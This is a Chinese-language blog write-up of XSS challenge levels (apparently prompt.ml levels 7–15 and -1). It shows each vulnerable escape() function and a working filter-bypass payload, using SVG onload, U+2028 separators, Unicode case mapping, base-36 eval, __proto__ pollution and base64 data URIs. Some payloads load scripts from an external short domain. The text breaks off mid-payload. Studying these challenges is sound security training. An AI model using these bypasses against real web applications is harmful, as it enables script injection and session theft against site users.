<h2 id="level7"><a class="headerlink" href="#level7" title="level7"></a>level7</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> {</span></div><div class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></div><div class="line">    var segments = input.split(<span class="string">'#'</span>);</div><div class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title)</span> {</span></div><div class="line">        <span class="comment">// title can only contain 12 characters</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="</span>comment<span class="string">" title="</span><span class="string">' + title.slice(0, 12) + '</span><span class="string">"&gt;&lt;/p&gt;'</span>;</div><div class="line">    }).join(<span class="string">'\n'</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这道题目开始没有看懂，题目的原意是根据#分离，每一部分赋给一个title，如果超过12字符，则需要截取前12个，这里使用的是js注释，使代码连起来。<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;svg/a=#"</span>onload='<span class="comment">/*#*/</span>prompt(<span class="number">1</span>)'</div></pre></td></tr></table></figure></p>
<p>这样就形成：<br/><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;p <span class="built_in">class</span>=<span class="string">"comment"</span> title=<span class="string">""</span>&gt;&lt;svg/a=<span class="string">"&gt;&lt;/p&gt;</span></div><div class="line">&lt;p class="comment<span class="string">" title="</span><span class="string">"onload='/*"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;p <span class="built_in">class</span>=<span class="string">"comment"</span> title=<span class="string">"*/prompt(1)'"</span>&gt;&lt;/p&gt;</div></pre></td></tr></table></figure></p>
<p>这里不能使用/**/闭合第一行和第二行之间的东西，是因为SVG文件中可以通过任意元素的onload事件执行Javascript,且不需要用户交互。例如：<br/><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg xmlns=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">g</span> <span class="attr">onload</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>这里可以看到只有让前面的svg闭合，才能在不用交互的情况下执行prompt(1)。<br/><a href="http://html5sec.org" rel="external" target="_blank">原址在这里</a></p>
<p>还有一种ie环境下会执行的：<br/><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;script x=#"</span><span class="keyword">async</span>=#<span class="string">"src="</span><span class="comment">//⒛₨</span></div></pre></td></tr></table></figure></p>
<p>小技巧：IE下可以使用##async##来加载不需要闭合的script文件.如下：<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"test.js"</span> <span class="attr">async</span>&gt;</span><span class="undefined"></span></div></pre></td></tr></table></figure></p>
<h2 id="level8"><a class="headerlink" href="#level8" title="level8"></a>level8</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// prevent input from getting out of comment</span></div><div class="line">    <span class="comment">// strip off line-breaks and stuff</span></div><div class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></div><div class="line">&lt;script&gt;                                    \n\</div><div class="line">    // console.log("' + input + <span class="string">'");        \n\</span></div><div class="line">&lt;/script&gt; ';</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这里过滤了两个换行符，所以用到了一个特殊的编码技巧：</p>
<ul>
<li><ls>是U+2028，是Unicode中的行分隔符。</ls></li>
<li><ps>是U+2029，是Unicode中的段落分隔符。<br/>而且–&gt;在js中可以当注释使用，<a href="https://javascript.spec.whatwg.org/#comment-syntax" rel="external" target="_blank">参考资料</a><br/>于是构造答案是这样的：<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">// console.log("</div><div class="line">prompt(1)</div><div class="line">--&gt;");</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
</ps></li>
</ul>
<p>可惜我也打不过这两个符号，所以不知道是不是这样的…<br/><figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="name">U+2028</span>]prompt(<span class="name">1</span>)[<span class="name">U+2028</span>]--&gt;</div></pre></td></tr></table></figure></p>
<h2 id="level9"><a class="headerlink" href="#level9" title="level9"></a>level9</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function escape(<span class="keyword">input</span>) {</div><div class="line">    <span class="comment">// filter potential start-tags</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.<span class="keyword">replace</span>(/&lt;([a-zA-Z])/<span class="keyword">g</span>, '&lt;_<span class="variable">$1</span>');</div><div class="line">    <span class="comment">// use all-caps for heading</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.toUpperCase();</div><div class="line"></div><div class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></div><div class="line">    <span class="keyword">return</span> '&lt;h1&gt;' + <span class="keyword">input</span> + '&lt;/h1&gt;';</div><div class="line">}</div></pre></td></tr></table></figure>
<p>简单的正则过滤，由&lt;(开始的后面加任意字母的时候，中间都加一个_。<br/>这里无法注入html的标签，但是toUppercase支持unicode字符，字符ſ经过函数toUpperCase()处理后，会变成ASCII码字符”S”。<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ſcript</span>/ſ<span class="attr">rc</span>=<span class="string">//⒕₨</span>&gt;</span><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>或者使用async<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ſcript</span>/<span class="attr">async</span>/<span class="attr">src</span>=<span class="string">//⒛₨</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>官方的解释是这样的：<br/>The special part here is the transformation behavior. Not all Unicode characters have matching representations when casted to capitals - so browsers often tend to simply take a look-alike, best-fit mapping ASCII character instead. There’s a fairly large range of characters with this behavior and all browsers do it a bit differently.</p>
<h2 id="level10"><a class="headerlink" href="#level10" title="level10"></a>level10</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Text Viewer</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></div><div class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</div><div class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></div><div class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这里会把prompt替换为alert，然后把’替换为空，但是因为替换顺序问题，所以出现了特殊的绕过方式，构造payload：<br/><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p'rompt(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<h2 id="level11"><a class="headerlink" href="#level11" title="level11"></a>level11</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> {</span></div><div class="line">    <span class="comment">// name should not contain special characters</span></div><div class="line">    var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="comment">// data to be parsed as JSON</span></div><div class="line">    var dataString = <span class="string">'{"</span>action<span class="string">":"</span>login<span class="string">","</span>message<span class="string">":"</span>Welcome back, <span class="string">' + memberName + '</span>.<span class="string">"}'</span>;</div><div class="line"></div><div class="line">    <span class="comment">// directly "parse" data in script context</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></div><div class="line">&lt;script&gt;                                    \n\</div><div class="line">    var data = ' + dataString + <span class="string">';          \n\</span></div><div class="line">    if (data.action === "login<span class="string">")            \n\</span></div><div class="line">        document.write(data.message)        \n\</div><div class="line">&lt;/script&gt; ';</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这道题过滤了几乎所有的符号，只有（）可以用，这里要用个黑科技，让字母有操作符的功能，就是in.<br/><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"(prompt(1))in"</span></div></pre></td></tr></table></figure></p>
<p>这里就会构造出<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">                                    </span></div><div class="line">    <span class="keyword">var</span> data = {<span class="string">"action"</span>:<span class="string">"login"</span>,<span class="string">"message"</span>:<span class="string">"Welcome back, "</span>(prompt(<span class="number">1</span>))<span class="keyword">in</span><span class="string">"."</span>};          </div><div class="line">    <span class="keyword">if</span> (data.action === <span class="string">"login"</span>)            </div><div class="line">        <span class="built_in">document</span>.write(data.message)        </div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里的原因是因为”test”(alert(1))虽然会提示语法错误， 但是还是会执行js语句。类似的alert(1)in”test”也是一样。可以在控制台下使用F12执行</p>
<h2 id="level12"><a class="headerlink" href="#level12" title="level12"></a>level12</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// in Soviet Russia...</span></div><div class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</div><div class="line">    <span class="comment">// table flips you!</span></div><div class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</div><div class="line"></div><div class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这道题是10的翻版，但是修复了10的漏洞，所以这里要使用eval的黑科技。<br/><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">parseInt</span>(<span class="string">"prompt"</span>,<span class="number">36</span>); <span class="comment">//1558153217</span></div></pre></td></tr></table></figure></p>
<p>用这个函数得到加密的代码，然后，得到payload：<br/><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<p>还有各种特殊的方式：<br/><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">eval</span>(<span class="params">630038579..toString(30</span>)</span>)(<span class="number">1</span>)</div><div class="line"> </div><div class="line"><span class="comment">// Hexadecimal alternative (630038579 == 0x258da033):</span></div></pre></td></tr></table></figure></p>
<p>甚至可以直接暴力循环着self里的函数，找到prompt：<br/><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">for((<span class="name">i</span>)in(<span class="name">self</span>))eval(<span class="name">i</span>)(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<h2 id="level13"><a class="headerlink" href="#level13" title="level13"></a>level13</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// extend method from Underscore library</span></div><div class="line">    <span class="comment">// _.extend(destination, *sources) </span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>{</div><div class="line">        <span class="keyword">var</span> source, prop;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) {</div><div class="line">            source = <span class="built_in">arguments</span>[i];</div><div class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) {</div><div class="line">                obj[prop] = source[prop];</div><div class="line">            }</div><div class="line">        }</div><div class="line">        <span class="keyword">return</span> obj;</div><div class="line">    }</div><div class="line">    <span class="comment">// a simple picture plugin</span></div><div class="line">    <span class="keyword">try</span> {</div><div class="line">        <span class="comment">// pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}</span></div><div class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</div><div class="line">        <span class="keyword">var</span> config = extend({</div><div class="line">            <span class="comment">// default image source</span></div><div class="line">            source: <span class="string">'http://placehold.it/350x150'</span></div><div class="line">        }, <span class="built_in">JSON</span>.parse(input));</div><div class="line">        <span class="comment">// forbit invalid image source</span></div><div class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) {</div><div class="line">            <span class="keyword">delete</span> config.source;</div><div class="line">        }</div><div class="line">        <span class="comment">// purify the source by stripping off "</span></div><div class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</div><div class="line">        <span class="comment">// insert the content using mustache-ish template</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="{{source}}"&gt;'</span>.replace(<span class="string">'{{source}}'</span>, source);</div><div class="line">    } <span class="keyword">catch</span> (e) {</div><div class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这题的源码实在过于复杂，于是这里贴上官方的解释和payload：<br/>这个题目涉及到js中的<strong>proto</strong>，每个对象都会在其内部初始化一个属性，就是<strong>proto</strong>，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去<strong>proto</strong>里面找这个属性，这个<strong>proto</strong>又会有自己的<strong>proto</strong>，一直这样找下去。可以再Chrome控制台中测试：<br/><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">config = {</div><div class="line">    <span class="string">"source"</span>: <span class="string">"_-_invalid-URL_-_"</span>,</div><div class="line">    <span class="string">"__proto__"</span>: {</div><div class="line">        <span class="string">"source"</span>: <span class="string">"my_evil_payload"</span></div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure></p>
<p>输入<br/><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">delete</span> <span class="built_in">config</span>.source</div><div class="line"><span class="built_in">config</span>.source</div></pre></td></tr></table></figure></p>
<p>返回my_evil_payload</p>
<p>还有一个技巧是，replace()这个函数，他还接受一些特殊的匹配模式。<br/><strong>$` 替换查找的字符串，并且在头部加上比配位置前的字符串部分</strong><br/>例如：<br/><figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">'123456</span><span class="symbol">'.replace</span>(<span class="symbol">'34</span>',<span class="symbol">'$</span>`xss')</div></pre></td></tr></table></figure></p>
<p>返回：<br/><figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">'1212xss56</span>'</div></pre></td></tr></table></figure></p>
<p>这样一来构造出payload:<br/><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">{<span class="attr">"source"</span>:{},<span class="attr">"__proto__"</span>:{<span class="attr">"source"</span>:<span class="string">"$`onerror=prompt(1)&gt;"</span>}}</div></pre></td></tr></table></figure></p>
<h2 id="level14"><a class="headerlink" href="#level14" title="level14"></a>level14</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Text Viewer</div><div class="line">function escape(<span class="keyword">input</span>) {</div><div class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></div><div class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></div><div class="line">    <span class="comment">// too lazy to convert them back in lower case</span></div><div class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.toUpperCase();</div><div class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.<span class="keyword">replace</span>(/\/\/|\w+:/<span class="keyword">g</span>, 'data:');</div><div class="line">    <span class="comment">// miscellaneous filtering</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.<span class="keyword">replace</span>(/[\\&amp;+%\s]|vbs/gi, '_');</div><div class="line"></div><div class="line">    <span class="keyword">return</span> '&lt;img src=<span class="string">"' + input + '"</span>&gt;';</div><div class="line">}</div></pre></td></tr></table></figure>
<p>1、首先所有的都是用大写字母。<br/>2、然后你无法执行任何url，都会被转化为data：<br/>3、最后包括\&amp;都被过滤，所以你不能使用十六进制或者10进制编码。</p>
<p>这里想到的是用base64绕过，但是由于必须是大写字母的关系，所以我们必须用特殊的手段，官方解释是这样的：<br/>One solution working in Firefox is to use the data scheme and hide the payload in base64. This will work because Firefox accepts “BASE64” as an encoding definition (compared to other browsers that require “base64” in lower case).</p>
<p>The remaining challenge is to craft a payload that will be represented upper case chars of base64. This can be achieved by using an upper case payload. for example, the following </p>
<p>payload:<br/><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;IFRAME/SRC="</span>x:text/html;base<span class="number">64</span>,ICA<span class="number">8</span>U<span class="number">0</span><span class="symbol">NSSVBUIC8</span>KU<span class="number">1</span>JDCSA<span class="number">9</span>SFRUUF<span class="name">M6</span>UE<span class="number">1</span>UMS<span class="number">5</span><span class="symbol">NTD4</span>JPC<span class="number">9</span>TQ<span class="number">1</span>JJUFQJPD<span class="number">4</span>=</div></pre></td></tr></table></figure></p>
<p>虽然base64帮助我们绕过很多，但是这里真正的黑魔法是msie，官方给出的是这样的：</p>
<p>While the Base64-based bypass was essentially a lot of engineering work, the true magic is in the MSIE version of this vector. Note that we bypass the check for // by using a Unicode representation of the slash. This and other Unicode characters work for that purpose. It has to be the second character only though. The first must be an actial slash (or solidus).<br/>可惜可能是浏览器问题，我仍然执行不了。</p>
<h2 id="level15"><a class="headerlink" href="#level15" title="level15"></a>level15</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> {</span></div><div class="line">    <span class="comment">// sort of spoiler of level 7</span></div><div class="line">    input = input.replace(/\*/g, <span class="string">''</span>);</div><div class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></div><div class="line">    var segments = input.split(<span class="string">'#'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title, index)</span> {</span></div><div class="line">        <span class="comment">// title can only contain 15 characters</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="</span>comment<span class="string">" title="</span><span class="string">' + title.slice(0, 15) + '</span><span class="string">" data-comment=\'{"</span>id<span class="string">":'</span> + index + <span class="string">'}\'&gt;&lt;/p&gt;'</span>;</div><div class="line">    }).join(<span class="string">'\n'</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这里和前面的7题类似，但是以15字母为一部分划分，而且js注释被过滤，不能使用/*，但是我们仍然可以使用html的注释绕过字符限制。<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1<span class="comment">&lt;!--#--&gt;</span>)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这样一来源码会变成：<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--" data-comment='{"id":0}'&gt;&lt;/p&gt;</span></div><div class="line">&lt;p class="comment" title="--&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--" data-comment='{"id":1}'&gt;&lt;/p&gt;</span></span></span></div><div class="line">&lt;p class="comment" title="--&gt;prompt(1<span class="comment">&lt;!--" data-comment='{"id":2}'&gt;&lt;/p&gt;</span></div><div class="line">&lt;p class="comment" title="--&gt;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>" data-comment='{"id":3}'&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="level-1"><a class="headerlink" href="#level-1" title="level-1"></a>level-1</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">function escape(input) {</div><div class="line">    // WORLD -1</div><div class="line"></div><div class="line">    // strip off certain characters from breaking conditional statement</div><div class="line">    input = input.replace(/[}&lt;]/g, '');</div><div class="line"></div><div class="line">    return '                                                     <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">&lt;script&gt;                                                         <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">    if (history.length &gt; 1337) {                                 <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">        // you can inject any code here                          <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">        // as long as it will be executed                        <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">        {{injection}}                                            <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">    }                                                            <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">&lt;/script&gt;                                                        <span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name"></span></span></div><div class="line">    '.replace('{{injection}}', input);</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这里可以看到过滤了一部分符号，而且判断长度必须大于1337，所以用到js变量提升，还用到了一个前面提到的关于replace的匹配技巧。<br/>playload：<br/><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">function history(L,o,r,e,m,I,p,s,u,m,i,s,s,i,m,p,l,y,d,u,m,m,y,t,e,x,t,o,f,t,h,e,p,r,i,n,t,i,n,g,a,n,d,t,y,p,e,s,e,t,t,i,n,g,i,n,d,u,s,t,r,y,L,o,r,e,m,I,p,s,u,m,h,a,s,b,e,e,n,t,h,e,i,n,d,u,s,t,r,y,s,s,t,a,n,d,a,r,d,d,u,m,m,y,t,e,x,t,e,v,e,r,s,i,n,c,e,t,h,e,s,w,h,e,n,a,n,u,n,k,n,o,w,n,p,r,i,n,t,e,r,t,o,o,k,a,g,a,l,l,e,y,o,f,t,y,p,e,a,n,d,s,c,r,a,m,b,l,e,d,i,t,t,o,m,a,k,e,a,t,y,p,e,s,p,e,c,i,m,e,n,b,o,o,k,I,t,h,a,s,s,u,r,v,i,v,e,d,n,o,t,o,n,l,y,f,i,v,e,c,e,n,t,u,r,i,e,s,b,u,t,a,l,s,o,t,h,e,l,e,a,p,i,n,t,o,e,l,e,c,t,r,o,n,i,c,t,y,p,e,s,e,t,t,i,n,g,r,e,m,a,i,n,i,n,g,e,s,s,e,n,t,i,a,l,l,y,u,n,c,h,a,n,g,e,d,I,t,w,a,s,p,o,p,u,l,a,r,i,s,e,d,i,n,t,h,e,s,w,i,t,h,t,h,e,r,e,l,e,a,s,e,o,f,L,e,t,r,a,s,e,t,s,h,e,e,t,s,c,o,n,t,a,i,n,i,n,g,L,o,r,e,m,I,p,s,u,m,p,a,s,s,a,g,e,s,a,n,d,m,o,r,e,r,e,c,e,n,t,l,y,w,i,t,h,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,s,o,f,t,w,a,r,e,l,i,k,e,A,l,d,u,s,P,a,g,e,M,a,k,e,r,i,n,c,l,u,d,i,n,g,v,e,r,s,i,o,n,s,o,f,L,o,r,e,m,I,p,s,u,m,I,t,i,s,a,l,o,n,g,e,s,t,a,b,l,i,s,h,e,d,f,a,c,t,t,h,a,t,a,r,e,a,d,e,r,w,i,l,l,b,e,d,i,s,t,r,a,c,t,e,d,b,y,t,h,e,r,e,a,d,a,b,l,e,c,o,n,t,e,n,t,o,f,a,p,a,g,e,w,h,e,n,l,o,o,k,i,n,g,a,t,i,t,s,l,a,y,o,u,t,T,h,e,p,o,i,n,t,o,f,u,s,i,n,g,L,o,r,e,m,I,p,s,u,m,i,s,t,h,a,t,i,t,h,a,s,a,m,o,r,e,o,r,l,e,s,s,n,o,r,m,a,l,d,i,s,t,r,i,b,u,t,i,o,n,o,f,l,e,t,t,e,r,s,a,s,o,p,p,o,s,e,d,t,o,u,s,i,n